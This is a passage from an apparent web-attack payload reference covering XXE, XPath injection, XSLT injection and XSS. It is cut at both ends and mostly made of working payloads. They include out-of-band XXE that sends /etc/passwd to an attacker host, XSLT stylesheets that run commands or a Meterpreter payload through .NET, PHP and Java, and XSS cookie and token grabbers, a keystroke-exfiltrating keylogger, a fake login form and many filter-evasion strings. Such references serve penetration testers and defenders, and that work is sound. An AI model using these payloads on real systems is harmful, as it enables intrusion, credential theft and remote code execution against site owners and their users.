\u0026#34;http://x.x.x.x:8000/xxe.dtd\u0026#34;\u0026gt;%asd;%c;]\u0026gt; \u0026lt;sst xmlns=\u0026#34;http://schemas.openxmlformats.org/spreadsheetml/2006/main\u0026#34; count=\u0026#34;10\u0026#34; uniqueCount=\u0026#34;10\u0026#34;\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;\u0026amp;rrr;\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;testA2\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;testA3\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;testA4\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;testA5\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;testB1\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;testB2\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;testB3\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;testB4\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;testB5\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;/sst\u0026gt; Using a remote DTD will save us the time to rebuild a document each time we want to retrieve a different file. Instead we build the document once and then change the DTD. And using FTP instead of HTTP allows to retrieve much larger files.\nxxe.dtd\n\u0026lt;!ENTITY % d SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; \u0026lt;!ENTITY % c \u0026#34;\u0026lt;!ENTITY rrr SYSTEM \u0026#39;ftp://x.x.x.x:2121/%d;\u0026#39;\u0026gt;\u0026#34;\u0026gt; Serve DTD and receive FTP payload using xxeserv:\n$ xxeserv -o files.log -p 2121 -w -wd public -wp 8000 XXE inside DTD file # Most XXE payloads detailed above require control over both the DTD or DOCTYPE block as well as the xml file. In rare situations, you may only control the DTD file and won\u0026rsquo;t be able to modify the xml file. For example, a MITM. When all you control is the DTD file, and you do not control the xml file, XXE may still be possible with this payload.\n\u0026lt;!-- Load the contents of a sensitive file into a variable --\u0026gt; \u0026lt;!ENTITY % payload SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; \u0026lt;!-- Use that variable to construct an HTTP get request with the file contents in the URL --\u0026gt; \u0026lt;!ENTITY % param1 \u0026#39;\u0026lt;!ENTITY \u0026amp;#37; external SYSTEM \u0026#34;http://my.evil-host.com/x=%payload;\u0026#34;\u0026gt;\u0026#39;\u0026gt; %param1; %external; XXE WAF Bypass via convert character encoding # In XXE WAFs, DTD Prolog are usually blacklisted BUT not all WAFs blacklist the UTF-16 character encoding\nAll XML processors must accept the UTF-8 and UTF-16 encodings of Unicode \u0026ndash; https://www.w3.org/XML/xml-V10-4e-errata#E11 we can convert the character encoding to UTF-16 using iconv to bypass the XXE WAF:-\ncat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE \u0026gt; utf16exploit.xml References # XML External Entity (XXE) Processing - OWASP Detecting and exploiting XXE in SAML Interfaces - 6. Nov. 2014 - Von Christian Mainka [Gist] staaldraad - XXE payloads [Gist] mgeeky - XML attacks Exploiting xxe in file upload functionality - BLACKHAT WEBCAST - 11/19/15 - Will Vandevanter - @will_is XXE ALL THE THINGS!!! (including Apple iOS\u0026rsquo;s Office Viewer) From blind XXE to root-level file read access - December 12, 2018 by Pieter Hiele How we got read access on Google’s production servers April 11, 2014 by detectify Blind OOB XXE At UBER 26+ Domains Hacked August 05, 2016 by Raghav Bisht OOB XXE through SAML by Sean\tMelia @seanmeals XXE in Uber to read local files 01/2017 XXE inside SVG JUNE 22, 2016 by YEO QUAN YANG Pentest XXE - @phonexicum Exploiting XXE with local DTD files - 12/12/2018 - Arseniy Sharoglazov Web Security Academy \u0026raquo; XML external entity (XXE) injection - 2019 PortSwigger Ltd Automating local DTD discovery for XXE exploitation - July 16 2019 by Philippe Arteau EXPLOITING XXE WITH EXCEL - NOV 12 2018 - MARC WICKENDEN excel-reader-xlsx #10 Midnight Sun CTF 2019 Quals - Rubenscube SynAck - A Deep Dive into XXE Injection - 22 July 2019 - Trenton Gordon Synacktiv - CVE-2019-8986: SOAP XXE in TIBCO JasperReports Server - 11-03-2019 - Julien SZLAMOWICZ, Sebastien DUDEK "},{"id":72,"href":"/docs/xpath_injection/","title":"XPATH Injection","section":"Docs","content":" XPATH injection # XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.\nExploitation # Similar to SQL : \u0026quot;string(//user[name/text()='\u0026quot; +vuln_var1+ \u0026quot;' and password/text()=’\u0026quot; +vuln_var1+ \u0026quot;']/account/text())\u0026quot;\n\u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1 \u0026#39; or \u0026#39;\u0026#39;=\u0026#39; x\u0026#39; or 1=1 or \u0026#39;x\u0026#39;=\u0026#39;y / // //* */* @* count(/child::node()) x\u0026#39; or name()=\u0026#39;username\u0026#39; or \u0026#39;x\u0026#39;=\u0026#39;y \u0026#39; and count(/*)=1 and \u0026#39;1\u0026#39;=\u0026#39;1 \u0026#39; and count(/@*)=1 and \u0026#39;1\u0026#39;=\u0026#39;1 \u0026#39; and count(/comment())=1 and \u0026#39;1\u0026#39;=\u0026#39;1 search=\u0026#39;)] | //user/*[contains(*,\u0026#39; search=Har\u0026#39;) and contains(../password,\u0026#39;c search=Har\u0026#39;) and starts-with(../password,\u0026#39;c Blind Exploitation # Size of a string and string-length(account)=SIZE_INT Extract a character substring(//user[userid=5]/username,2,1)=CHAR_HERE substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE) Out Of Band Exploitation # http://example.com/?title=Foundation\u0026amp;type=*\u0026amp;rent_days=* and doc(\u0026#39;//10.10.10.10/SHARE\u0026#39;) Tools # xcat - Automate XPath injection attacks to retrieve documents xxxpwn - Advanced XPath Injection Tool xxxpwn_smart - A fork of xxxpwn using predictive text xpath-blind-explorer XmlChor - Xpath injection exploitation tool References # OWASP XPATH Injection Places of Interest in Stealing NetNTLM Hashes - Osanda Malith Jayathissa - March 24, 2017 "},{"id":73,"href":"/docs/xslt_injection/","title":"XSLT Injection","section":"Docs","content":" XSLT Injection # Processing an un-validated XSL stylesheet can allow an attacker to change the structure and contents of the resultant XML, include arbitrary files from the file system, or execute arbitrary code\nTools # Exploit # Determine the vendor and version # \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;xsl:stylesheet version=\u0026#34;1.0\u0026#34; xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34;\u0026gt; \u0026lt;xsl:template match=\u0026#34;/fruits\u0026#34;\u0026gt; \u0026lt;xsl:value-of select=\u0026#34;system-property(\u0026#39;xsl:vendor\u0026#39;)\u0026#34;/\u0026gt; \u0026lt;/xsl:template\u0026gt; \u0026lt;/xsl:stylesheet\u0026gt; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;html xsl:version=\u0026#34;1.0\u0026#34; xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34; xmlns:php=\u0026#34;http://php.net/xsl\u0026#34;\u0026gt; \u0026lt;body\u0026gt; \u0026lt;br /\u0026gt;Version: \u0026lt;xsl:value-of select=\u0026#34;system-property(\u0026#39;xsl:version\u0026#39;)\u0026#34; /\u0026gt; \u0026lt;br /\u0026gt;Vendor: \u0026lt;xsl:value-of select=\u0026#34;system-property(\u0026#39;xsl:vendor\u0026#39;)\u0026#34; /\u0026gt; \u0026lt;br /\u0026gt;Vendor URL: \u0026lt;xsl:value-of select=\u0026#34;system-property(\u0026#39;xsl:vendor-url\u0026#39;)\u0026#34; /\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; External Entity # \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE dtd_sample[\u0026lt;!ENTITY ext_file SYSTEM \u0026#34;C:\\secretfruit.txt\u0026#34;\u0026gt;]\u0026gt; \u0026lt;xsl:stylesheet version=\u0026#34;1.0\u0026#34; xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34;\u0026gt; \u0026lt;xsl:template match=\u0026#34;/fruits\u0026#34;\u0026gt; Fruits \u0026amp;ext_file;: \u0026lt;!-- Loop for each fruit --\u0026gt; \u0026lt;xsl:for-each select=\u0026#34;fruit\u0026#34;\u0026gt; \u0026lt;!-- Print name: description --\u0026gt; - \u0026lt;xsl:value-of select=\u0026#34;name\u0026#34;/\u0026gt;: \u0026lt;xsl:value-of select=\u0026#34;description\u0026#34;/\u0026gt; \u0026lt;/xsl:for-each\u0026gt; \u0026lt;/xsl:template\u0026gt; \u0026lt;/xsl:stylesheet\u0026gt; Read files and SSRF using document # \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;xsl:stylesheet version=\u0026#34;1.0\u0026#34; xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34;\u0026gt; \u0026lt;xsl:template match=\u0026#34;/fruits\u0026#34;\u0026gt; \u0026lt;xsl:copy-of select=\u0026#34;document(\u0026#39;http://172.16.132.1:25\u0026#39;)\u0026#34;/\u0026gt; \u0026lt;xsl:copy-of select=\u0026#34;document(\u0026#39;/etc/passwd\u0026#39;)\u0026#34;/\u0026gt; \u0026lt;xsl:copy-of select=\u0026#34;document(\u0026#39;file:///c:/winnt/win.ini\u0026#39;)\u0026#34;/\u0026gt; Fruits: \u0026lt;!-- Loop for each fruit --\u0026gt; \u0026lt;xsl:for-each select=\u0026#34;fruit\u0026#34;\u0026gt; \u0026lt;!-- Print name: description --\u0026gt; - \u0026lt;xsl:value-of select=\u0026#34;name\u0026#34;/\u0026gt;: \u0026lt;xsl:value-of select=\u0026#34;description\u0026#34;/\u0026gt; \u0026lt;/xsl:for-each\u0026gt; \u0026lt;/xsl:template\u0026gt; \u0026lt;/xsl:stylesheet\u0026gt; Remote Code Execution with Embedded Script Blocks # \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;xsl:stylesheet version=\u0026#34;1.0\u0026#34; xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34; xmlns:msxsl=\u0026#34;urn:schemas-microsoft-com:xslt\u0026#34; xmlns:user=\u0026#34;urn:my-scripts\u0026#34;\u0026gt; \u0026lt;msxsl:script language = \u0026#34;C#\u0026#34; implements-prefix = \u0026#34;user\u0026#34;\u0026gt; \u0026lt;![CDATA[ public string execute(){ System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName= \u0026#34;C:\\\\windows\\\\system32\\\\cmd.exe\u0026#34;; proc.StartInfo.RedirectStandardOutput = true; proc.StartInfo.UseShellExecute = false; proc.StartInfo.Arguments = \u0026#34;/c dir\u0026#34;; proc.Start(); proc.WaitForExit(); return proc.StandardOutput.ReadToEnd(); } ]]\u0026gt; \u0026lt;/msxsl:script\u0026gt; \u0026lt;xsl:template match=\u0026#34;/fruits\u0026#34;\u0026gt; +++ BEGIN COMMAND OUTPUT +++ \u0026lt;xsl:value-of select=\u0026#34;user:execute()\u0026#34;/\u0026gt; +++ END COMMAND OUTPUT +++\t\u0026lt;/xsl:template\u0026gt; \u0026lt;/xsl:stylesheet\u0026gt; Remote Code Execution with PHP wrapper # Execute the function readfile.\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;html xsl:version=\u0026#34;1.0\u0026#34; xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34; xmlns:php=\u0026#34;http://php.net/xsl\u0026#34;\u0026gt; \u0026lt;body\u0026gt; \u0026lt;xsl:value-of select=\u0026#34;php:function(\u0026#39;readfile\u0026#39;,\u0026#39;index.php\u0026#39;)\u0026#34; /\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Execute the function scandir.\n\u0026lt;xsl:stylesheet xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34; xmlns:php=\u0026#34;http://php.net/xsl\u0026#34; version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;xsl:template match=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;xsl:value-of name=\u0026#34;assert\u0026#34; select=\u0026#34;php:function(\u0026#39;scandir\u0026#39;, \u0026#39;.\u0026#39;)\u0026#34;/\u0026gt; \u0026lt;/xsl:template\u0026gt; \u0026lt;/xsl:stylesheet\u0026gt; Execute a remote php file using assert\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;html xsl:version=\u0026#34;1.0\u0026#34; xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34; xmlns:php=\u0026#34;http://php.net/xsl\u0026#34;\u0026gt; \u0026lt;body style=\u0026#34;font-family:Arial;font-size:12pt;background-color:#EEEEEE\u0026#34;\u0026gt; \u0026lt;xsl:variable name=\u0026#34;payload\u0026#34;\u0026gt; include(\u0026#34;http://10.10.10.10/test.php\u0026#34;) \u0026lt;/xsl:variable\u0026gt; \u0026lt;xsl:variable name=\u0026#34;include\u0026#34; select=\u0026#34;php:function(\u0026#39;assert\u0026#39;,$payload)\u0026#34;/\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Execute a PHP meterpreter using PHP wrapper.\n\u0026lt;xsl:stylesheet xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34; xmlns:php=\u0026#34;http://php.net/xsl\u0026#34; version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;xsl:template match=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;xsl:variable name=\u0026#34;eval\u0026#34;\u0026gt; eval(base64_decode(\u0026#39;Base64-encoded Meterpreter code\u0026#39;)) \u0026lt;/xsl:variable\u0026gt; \u0026lt;xsl:variable name=\u0026#34;preg\u0026#34; select=\u0026#34;php:function(\u0026#39;preg_replace\u0026#39;, \u0026#39;/.*/e\u0026#39;, $eval, \u0026#39;\u0026#39;)\u0026#34;/\u0026gt; \u0026lt;/xsl:template\u0026gt; \u0026lt;/xsl:stylesheet\u0026gt; Remote Code Execution with Java # \u0026lt;xsl:stylesheet version=\u0026#34;1.0\u0026#34; xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34; xmlns:rt=\u0026#34;http://xml.apache.org/xalan/java/java.lang.Runtime\u0026#34; xmlns:ob=\u0026#34;http://xml.apache.org/xalan/java/java.lang.Object\u0026#34;\u0026gt; \u0026lt;xsl:template match=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;xsl:variable name=\u0026#34;rtobject\u0026#34; select=\u0026#34;rt:getRuntime()\u0026#34;/\u0026gt; \u0026lt;xsl:variable name=\u0026#34;process\u0026#34; select=\u0026#34;rt:exec($rtobject,\u0026#39;ls\u0026#39;)\u0026#34;/\u0026gt; \u0026lt;xsl:variable name=\u0026#34;processString\u0026#34; select=\u0026#34;ob:toString($process)\u0026#34;/\u0026gt; \u0026lt;xsl:value-of select=\u0026#34;$processString\u0026#34;/\u0026gt; \u0026lt;/xsl:template\u0026gt; \u0026lt;/xsl:stylesheet\u0026gt; \u0026lt;xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;xsl:stylesheet version=\u0026#34;2.0\u0026#34; xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34; xmlns:java=\u0026#34;http://saxon.sf.net/java-type\u0026#34;\u0026gt; \u0026lt;xsl:template match=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;xsl:value-of select=\u0026#34;Runtime:exec(Runtime:getRuntime(),\u0026#39;cmd.exe /C ping IP\u0026#39;)\u0026#34; xmlns:Runtime=\u0026#34;java:java.lang.Runtime\u0026#34;/\u0026gt; \u0026lt;/xsl:template\u0026gt;. \u0026lt;/xsl:stylesheet\u0026gt; Remote Code Execution with Native .NET # \u0026lt;xsl:stylesheet version=\u0026#34;1.0\u0026#34; xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34; xmlns:msxsl=\u0026#34;urn:schemas-microsoft-com:xslt\u0026#34; xmlns:App=\u0026#34;http://www.tempuri.org/App\u0026#34;\u0026gt; \u0026lt;msxsl:script implements-prefix=\u0026#34;App\u0026#34; language=\u0026#34;C#\u0026#34;\u0026gt; \u0026lt;![CDATA[ public string ToShortDateString(string date) { System.Diagnostics.Process.Start(\u0026#34;cmd.exe\u0026#34;); return \u0026#34;01/01/2001\u0026#34;; } ]]\u0026gt; \u0026lt;/msxsl:script\u0026gt; \u0026lt;xsl:template match=\u0026#34;ArrayOfTest\u0026#34;\u0026gt; \u0026lt;TABLE\u0026gt; \u0026lt;xsl:for-each select=\u0026#34;Test\u0026#34;\u0026gt; \u0026lt;TR\u0026gt; \u0026lt;TD\u0026gt; \u0026lt;xsl:value-of select=\u0026#34;App:ToShortDateString(TestDate)\u0026#34; /\u0026gt; \u0026lt;/TD\u0026gt; \u0026lt;/TR\u0026gt; \u0026lt;/xsl:for-each\u0026gt; \u0026lt;/TABLE\u0026gt; \u0026lt;/xsl:template\u0026gt; \u0026lt;/xsl:stylesheet\u0026gt; References # From XSLT code execution to Meterpreter shells - 02 July 2012 - @agarri XSLT Injection - Fortify XSLT Injection Basics - Saxon "},{"id":74,"href":"/docs/xss_injection/","title":"XSS Injection","section":"Docs","content":" Cross Site Scripting # Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.\nExploit code or POC # Data grabber for XSS # Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page.\n\u0026lt;script\u0026gt;document.location=\u0026#39;http://localhost/XSS/grabber.php?c=\u0026#39;+document.cookie\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;document.location=\u0026#39;http://localhost/XSS/grabber.php?c=\u0026#39;+localStorage.getItem(\u0026#39;access_token\u0026#39;)\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;new Image().src=\u0026#34;http://localhost/cookie.php?c=\u0026#34;+document.cookie;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;new Image().src=\u0026#34;http://localhost/cookie.php?c=\u0026#34;+localStorage.getItem(\u0026#39;access_token\u0026#39;);\u0026lt;/script\u0026gt; Write the collected data into a file.\n\u0026lt;?php $cookie = $_GET[\u0026#39;c\u0026#39;]; $fp = fopen(\u0026#39;cookies.txt\u0026#39;, \u0026#39;a+\u0026#39;); fwrite($fp, \u0026#39;Cookie:\u0026#39; .$cookie.\u0026#34;\\r\\n\u0026#34;); fclose($fp); ?\u0026gt; CORS # \u0026lt;script\u0026gt; fetch(\u0026#39;https://\u0026lt;SESSION\u0026gt;.burpcollaborator.net\u0026#39;, { method: \u0026#39;POST\u0026#39;, mode: \u0026#39;no-cors\u0026#39;, body: document.cookie }); \u0026lt;/script\u0026gt; UI redressing # Leverage the XSS to modify the HTML content of the page in order to display a fake login form.\n\u0026lt;script\u0026gt; history.replaceState(null, null, \u0026#39;../../../login\u0026#39;); document.body.innerHTML = \u0026#34;\u0026lt;/br\u0026gt;\u0026lt;/br\u0026gt;\u0026lt;/br\u0026gt;\u0026lt;/br\u0026gt;\u0026lt;/br\u0026gt;\u0026lt;h1\u0026gt;Please login to continue\u0026lt;/h1\u0026gt;\u0026lt;form\u0026gt;Username: \u0026lt;input type=\u0026#39;text\u0026#39;\u0026gt;Password: \u0026lt;input type=\u0026#39;password\u0026#39;\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;input value=\u0026#39;submit\u0026#39; type=\u0026#39;submit\u0026#39;\u0026gt;\u0026#34; \u0026lt;/script\u0026gt; Javascript keylogger # Another way to collect sensitive data is to set a javascript keylogger.\n\u0026lt;img src=x onerror=\u0026#39;document.onkeypress=function(e){fetch(\u0026#34;http://domain.com?k=\u0026#34;+String.fromCharCode(e.which))},this.remove();\u0026#39;\u0026gt; Other ways # More exploits at http://www.xss-payloads.com/payloads-list.html?a#category=all:\nTaking screenshots using XSS and the HTML5 Canvas JavaScript Port Scanner Network Scanner .NET Shell execution Redirect Form Play Music Identify an XSS endpoint # This payload opens the debugger in the developer console rather than triggering a popup alert box.\n\u0026lt;script\u0026gt;debugger;\u0026lt;/script\u0026gt; Modern applications with content hosting can use sandbox domains\nto safely host various types of user-generated content. Many of these sandboxes are specifically meant to isolate user-uploaded HTML, JavaScript, or Flash applets and make sure that they can\u0026rsquo;t access any user data.\nFor this reason, it\u0026rsquo;s better to use alert(document.domain) or alert(window.origin) rather than alert(1) as default XSS payload in order to know in which scope the XSS is actually executing.\nBetter payload replacing \u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;:\n\u0026lt;script\u0026gt;alert(document.domain.concat(\u0026#34;\\n\u0026#34;).concat(window.origin))\u0026lt;/script\u0026gt; While alert() is nice for reflected XSS it can quickly become a burden for stored XSS because it requires to close the popup for each execution, so console.log() can be used instead to display a message in the console of the developer console (doesn\u0026rsquo;t require any interaction).\nExample:\n\u0026lt;script\u0026gt;console.log(\u0026#34;Test XSS from the search bar of page XYZ\\n\u0026#34;.concat(document.domain).concat(\u0026#34;\\n\u0026#34;).concat(window.origin))\u0026lt;/script\u0026gt; References:\nGoogle Bughunter University - XSS in sandbox domains LiveOverflow Video - DO NOT USE alert(1) for XSS LiveOverflow blog post - DO NOT USE alert(1) for XSS Tools # Most tools are also suitable for blind XSS attacks:\nXSSStrike: Very popular but unfortunately not very well maintained xsser: Utilizes a headless browser to detect XSS vulnerabilities Dalfox: Extensive functionality and extremely fast thanks to the implementation in Go XSpear: Similar to Dalfox but based on Ruby domdig: Headless Chrome XSS Tester XSS in HTML/Applications # Common Payloads # // Basic payload \u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt; \u0026lt;scr\u0026lt;script\u0026gt;ipt\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/scr\u0026lt;script\u0026gt;ipt\u0026gt; \u0026#34;\u0026gt;\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt; \u0026#34;\u0026gt;\u0026lt;script\u0026gt;alert(String.fromCharCode(88,83,83))\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;\\u0061lert(\u0026#39;22\u0026#39;)\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;eval(\u0026#39;\\x61lert(\\\u0026#39;33\\\u0026#39;)\u0026#39;)\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;eval(8680439..toString(30))(983801..toString(36))\u0026lt;/script\u0026gt; //parseInt(\u0026#34;confirm\u0026#34;,30) == 8680439 \u0026amp;\u0026amp; 8680439..toString(30) == \u0026#34;confirm\u0026#34; \u0026lt;object/data=\u0026#34;jav\u0026amp;#x61;sc\u0026amp;#x72;ipt\u0026amp;#x3a;al\u0026amp;#x65;rt\u0026amp;#x28;23\u0026amp;#x29;\u0026#34;\u0026gt; // Img payload \u0026lt;img src=x onerror=alert(\u0026#39;XSS\u0026#39;);\u0026gt; \u0026lt;img src=x onerror=alert(\u0026#39;XSS\u0026#39;)// \u0026lt;img src=x onerror=alert(String.fromCharCode(88,83,83));\u0026gt; \u0026lt;img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));\u0026gt; \u0026lt;img src=x:alert(alt) onerror=eval(src) alt=xss\u0026gt; \u0026#34;\u0026gt;\u0026lt;img src=x onerror=alert(\u0026#39;XSS\u0026#39;);\u0026gt; \u0026#34;\u0026gt;\u0026lt;img src=x onerror=alert(String.fromCharCode(88,83,83));\u0026gt; // Svg payload \u0026lt;svg\u000conload=alert(1)\u0026gt; \u0026lt;svg/onload=alert(\u0026#39;XSS\u0026#39;)\u0026gt; \u0026lt;svg onload=alert(1)// \u0026lt;svg/onload=alert(String.fromCharCode(88,83,83))\u0026gt; \u0026lt;svg id=alert(1) onload=eval(id)\u0026gt; \u0026#34;\u0026gt;\u0026lt;svg/onload=alert(String.fromCharCode(88,83,83))\u0026gt; \u0026#34;\u0026gt;\u0026lt;svg/onload=alert(/XSS/) \u0026lt;svg\u0026gt;\u0026lt;script href=data:,alert(1) /\u0026gt;(`Firefox` is the only browser which allows self closing script) \u0026lt;svg\u0026gt;\u0026lt;script\u0026gt;alert(\u0026#39;33\u0026#39;) \u0026lt;svg\u0026gt;\u0026lt;script\u0026gt;alert\u0026amp;lpar;\u0026#39;33\u0026#39;\u0026amp;rpar; // Div payload \u0026lt;div onpointerover=\u0026#34;alert(45)\u0026#34;\u0026gt;MOVE HERE\u0026lt;/div\u0026gt; \u0026lt;div onpointerdown=\u0026#34;alert(45)\u0026#34;\u0026gt;MOVE HERE\u0026lt;/div\u0026gt; \u0026lt;div onpointerenter=\u0026#34;alert(45)\u0026#34;\u0026gt;MOVE HERE\u0026lt;/div\u0026gt; \u0026lt;div onpointerleave=\u0026#34;alert(45)\u0026#34;\u0026gt;MOVE HERE\u0026lt;/div\u0026gt; \u0026lt;div onpointermove=\u0026#34;alert(45)\u0026#34;\u0026gt;MOVE HERE\u0026lt;/div\u0026gt; \u0026lt;div onpointerout=\u0026#34;alert(45)\u0026#34;\u0026gt;MOVE HERE\u0026lt;/div\u0026gt; \u0026lt;div onpointerup=\u0026#34;alert(45)\u0026#34;\u0026gt;MOVE HERE\u0026lt;/div\u0026gt; XSS using HTML5 tags # \u0026lt;body onload=alert(/XSS/.source)\u0026gt; \u0026lt;input autofocus onfocus=alert(1)\u0026gt; \u0026lt;select autofocus onfocus=alert(1)\u0026gt; \u0026lt;textarea autofocus onfocus=alert(1)\u0026gt; \u0026lt;keygen autofocus onfocus=alert(1)\u0026gt; \u0026lt;video/poster/onerror=alert(1)\u0026gt; \u0026lt;video\u0026gt;\u0026lt;source onerror=\u0026#34;javascript:alert(1)\u0026#34;\u0026gt; \u0026lt;video src=_ onloadstart=\u0026#34;alert(1)\u0026#34;\u0026gt; \u0026lt;details/open/ontoggle=\u0026#34;alert`1`\u0026#34;\u0026gt; \u0026lt;audio src onloadstart=alert(1)\u0026gt; \u0026lt;marquee onstart=alert(1)\u0026gt; \u0026lt;meter value=2 min=0 max=10 onmouseover=alert(1)\u0026gt;2 out of 10\u0026lt;/meter\u0026gt; \u0026lt;body ontouchstart=alert(1)\u0026gt; // Triggers when a finger touch the screen \u0026lt;body ontouchend=alert(1)\u0026gt; // Triggers when a finger is removed from touch screen \u0026lt;body ontouchmove=alert(1)\u0026gt; // When a finger is dragged across the screen. XSS using a remote JS # \u0026lt;svg/onload=\u0026#39;fetch(\u0026#34;//host/a\u0026#34;).then(r=\u0026gt;r.text().then(t=\u0026gt;eval(t)))\u0026#39;\u0026gt; \u0026lt;script src=14.rs\u0026gt; // you can also specify an arbitrary payload with 14.rs/#payload e.g: 14.rs/#alert(document.domain) XSS in hidden input # \u0026lt;input type=\u0026#34;hidden\u0026#34; accesskey=\u0026#34;X\u0026#34; onclick=\u0026#34;alert(1)\u0026#34;\u0026gt; Use CTRL+SHIFT+X to trigger the onclick event XSS when payload is reflected capitalized # \u0026lt;IMG SRC=1 ONERROR=\u0026amp;#X61;\u0026amp;#X6C;\u0026amp;#X65;\u0026amp;#X72;\u0026amp;#X74;(1)\u0026gt; DOM based XSS # Based on a DOM XSS sink.\n#\u0026#34;\u0026gt;\u0026lt;img src=/ onerror=alert(2)\u0026gt; XSS in JS Context # -(confirm)(document.domain)// ; alert(1);// // (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic) XSS in wrappers javascript and data URI # XSS with javascript:\njavascript:prompt(1) %26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341 \u0026amp;#106\u0026amp;#97\u0026amp;#118\u0026amp;#97\u0026amp;#115\u0026amp;#99\u0026amp;#114\u0026amp;#105\u0026amp;#112\u0026amp;#116\u0026amp;#58\u0026amp;#99\u0026amp;#111\u0026amp;#110\u0026amp;#102\u0026amp;#105\u0026amp;#114\u0026amp;#109\u0026amp;#40\u0026amp;#49\u0026amp;#41 We can encode the \u0026#34;javascript:\u0026#34; in Hex/Octal \\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3aalert(1) \\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003aalert(1) \\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\072alert(1) We can use a \u0026#39;newline character\u0026#39; java%0ascript:alert(1) - LF (\\n) java%09script:alert(1) - Horizontal tab (\\t) java%0dscript:alert(1) - CR (\\r) Using the escape character \\j\\av\\a\\s\\cr\\i\\pt\\:\\a\\l\\ert\\(1\\) Using the newline and a comment // javascript://%0Aalert(1) javascript://anything%0D%0A%0D%0Awindow.alert(1) XSS with 